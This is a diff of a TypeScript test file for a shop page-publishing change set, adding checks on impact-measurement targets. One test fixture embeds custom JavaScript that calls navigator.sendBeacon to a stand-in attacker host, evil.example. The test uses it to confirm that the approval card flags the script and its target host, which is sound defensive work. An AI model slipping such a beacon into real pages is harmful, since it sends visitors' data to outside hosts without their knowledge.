@@ -272,6 +272,11 @@ test('buildPublishChangeSet: landing page URL is normalized, invalid URL/duplica
   const cat = await buildPublishChangeSet(f.sw, SPEC, { target: 'category', categoryId: 'cat', metaTitle: 'Titel' });
   assert.equal(cat.items[1].label, 'Kategorie „Vasen“'); assert.equal(cat.items[2].after, 'Titel');
   assert.equal(cat.script, undefined, 'no warning without JS');
+  assert.deepEqual(cat.measureTargets, [{ entity: 'category', id: 'cat', label: 'Vasen' }], 'impact measurement: the replaced category layout');
+  assert.equal(ok.measureTargets, undefined, 'a new landing page has no search data before');
+  const { measureTargets, MEASURE_TARGETS_MAX } = await import('../../src/server/changes');
+  assert.deepEqual(measureTargets('product', []), {});
+  assert.deepEqual(measureTargets('product', Array.from({ length: MEASURE_TARGETS_MAX + 1 }, (_, i) => ({ id: String(i), label: 'x' }))), {}, 'shop-wide layouts are not attributed to single pages');
   const js = await buildPublishChangeSet(f.sw, { ...SPEC, sections: [{ blocks: [{ type: 'custom-html', html: '<p>x</p>', js: "navigator.sendBeacon('https://evil.example/c')" }, { type: 'product-listing' }] }] } as unknown as PageSpec, { target: 'category', categoryId: 'cat' });
   assert.deepEqual(js.script, { kinds: ['js'], hosts: ['evil.example'] }, 'approval card shows JavaScript and target address');
 });
